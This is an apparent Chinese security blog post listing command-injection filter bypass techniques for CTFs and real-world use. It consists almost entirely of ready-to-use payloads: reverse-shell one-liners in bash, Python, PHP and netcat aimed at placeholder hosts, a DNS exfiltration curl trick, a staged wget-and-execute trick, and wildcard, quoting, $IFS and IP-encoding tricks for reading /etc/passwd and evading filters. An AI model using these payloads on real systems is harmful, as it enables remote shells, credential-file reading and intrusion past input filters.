\---

layout: post

title: "命令注入bypass总结（长期更新）"

subtitle: "一些各种实战奇淫技巧,CTF Trick"

date: 2018-12-20

author: otto.known

category: security

finished: true

\---



[TOC]



\```bash

sh -c "cmd"





bash -i >& /dev/tcp/ip/port 0>&1



python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"



php -r 'exec("bash -i >& /dev/tcp/ip/port 0>&1");'



php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'



nc -e /bin/bash ip port





\```



\```bash

` & || | $()



%0a 换行符



%0d 回车符



;  连续指令



a=l;b=s;$a$b 局部变量



curl `whoami`xxxx.xxx DNS管道解析

\```







==Trick==

\```bash

1>wget\

1>xxx.com.\

1>com\

1>-O\

1>she\

1>ll.p\

1>p

ls -t>a

sh a

\```

\> ls -t 是按照时间顺排序





http://2130706433  IP转10进制



http://0x7F000001  IP转16进制



\> 转化网址：http://www.msxindl.com/tools/ip/ip_num.asp



\## 通配符





\```bash

/???/n? -e /???/b??h 127.0.0.1 6666



bin/nc -e /bin/bash 127.0.0.1 6666



/???/c?t /?t?/p??swd

\```







\```

\*  代表『 0 个到无穷多个』任意字符

?  代表『一定有一个』任意字符

[ ]  同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』

[ - ]  若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！

[^ ]  若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思

\```





\## cat flag->





\```bash

cat fla[a-z]





cat fl[a]g



cat f``lag



c’a’t /f’la’g



cat fl??



cat f*

cat $(echo -n "base64加密的flag" | base64-d)



cat `echo -n "base64加密的flag" | base64-d`



c\at /fl\ag



head /`ls /|grep 'fla'



a=c;b=at;c=fl;d=ag;$a$b $c$d

\```





\## 利用历史执行记录来bypass

\```bash

root@kali$ cat

root@kali$ fl

root@kali$ ag



root@kali$ history

1.cat

2.fl

3.ag



root@kali$ !1!2!3

flag{ea3y_bypa3s_inj3ct1on}



\```





==过滤空格的时候==



\```bash

cat${IFS}flag



cat$IFS$9flag



<



``

\```



%09 (需要php环境)







\## 命令终止符





\```

%00 %20

\```



\## 其他绕过



\```bash

cat$u /etc$u/passwd$u



/?in/cat /?tc/p?sswd



/'b'i'n'/'c'a't' /'e't'c'/'p'a's's'w'd



/"b"i"n"/"w"h"i"c"h" "n"c



/b\i\n/w\h\i\c\h n\c





\```



\## 写文件



Windows





\```

echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 >hex.txt

生成 hex.txt，机器码对应的内容是 Hallo World!

certutil -decodehex hex.txt bin.txt

也可以base64解码

certutil -decode hex.txt bin.txt

\```



Linux



\```bash

echo -e "\x61">1.txt

\```